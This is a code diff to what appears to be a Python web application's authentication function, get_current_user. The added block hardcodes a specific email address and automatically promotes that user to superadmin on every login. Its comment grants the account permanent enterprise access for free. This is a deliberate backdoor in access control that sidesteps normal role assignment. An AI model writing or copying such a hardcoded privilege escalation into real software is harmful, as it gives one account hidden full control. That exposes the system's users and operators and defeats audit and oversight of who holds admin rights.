@@ -54,6 +54,14 @@ async def get_current_user(
     if not user or not user.is_active:
         raise UnauthorizedError()
 
+    # ── SUPERUSER HARDCODE ──────────────────────────────────
+    # jadelsolara@pm.me is ALWAYS superadmin with enterprise, free forever
+    SUPERUSER_EMAIL = "jadelsolara@pm.me"
+    if user.email == SUPERUSER_EMAIL and user.role != Role.superadmin:
+        user.role = Role.superadmin
+        await db.flush()
+        logger.info("Auto-promoted %s to superadmin", SUPERUSER_EMAIL)
+
     # Set audit context for hash-chain audit trail
     from src.core.audit import audit_user_id as _audit_uid, audit_org_id as _audit_oid
 
